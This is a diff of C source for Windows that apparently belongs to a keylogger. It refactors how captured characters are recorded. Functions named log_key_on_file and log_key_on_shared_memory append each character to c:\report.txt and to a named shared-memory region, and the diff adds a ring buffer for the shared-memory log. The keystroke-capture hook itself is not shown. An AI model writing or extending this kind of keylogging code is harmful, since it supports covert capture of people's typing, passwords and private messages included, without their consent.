@@ -2,6 +2,17 @@
 #include <stdlib.h>
 #include <stdio.h>
 
+#define SHARED_MEMORY_BUFFER_SIZE 256
+#define SHARED_MEMORY_SIZE        sizeof(shared_memory_content_t)
+
+typedef struct {
+    unsigned int writer_index;
+    unsigned int reader_index;
+    char buffer[SHARED_MEMORY_BUFFER_SIZE];
+}shared_memory_content_t;
+
+static void write_to_shared_memory(shared_memory_content_t *shared_memory_content, char character);
+
 static void log_key_on_file(char character) {
     FILE* f1 = fopen("c:\\report.txt","a+");
     fwrite(&character,1,1,f1);
@@ -12,8 +23,7 @@ static void log_key_on_shared_memory(char character) {
     HANDLE handle_shared_memory;
     void *shared_memory;
     char *shared_memory_name = "MySharedMemory";
-    unsigned int shared_memory_size = 256;
-    char message[2] = {character, '\0'};
+    unsigned int shared_memory_size = SHARED_MEMORY_SIZE;
 
     handle_shared_memory = OpenFileMapping(
         FILE_MAP_ALL_ACCESS,   // read/write access
@@ -36,10 +46,15 @@ static void log_key_on_shared_memory(char character) {
         return;
     }
 
-    CopyMemory((PVOID) shared_memory, message, 2);
+    write_to_shared_memory((shared_memory_content_t *) shared_memory, character);
 
     UnmapViewOfFile(shared_memory);
     CloseHandle(handle_shared_memory);
+}
+
+static void write_to_shared_memory(shared_memory_content_t *shared_memory_content, char character) {
+    shared_memory_content->buffer[shared_memory_content->writer_index++] = character;
+    shared_memory_content->writer_index %= SHARED_MEMORY_BUFFER_SIZE;
 }
 
 static void logChar(char character) {
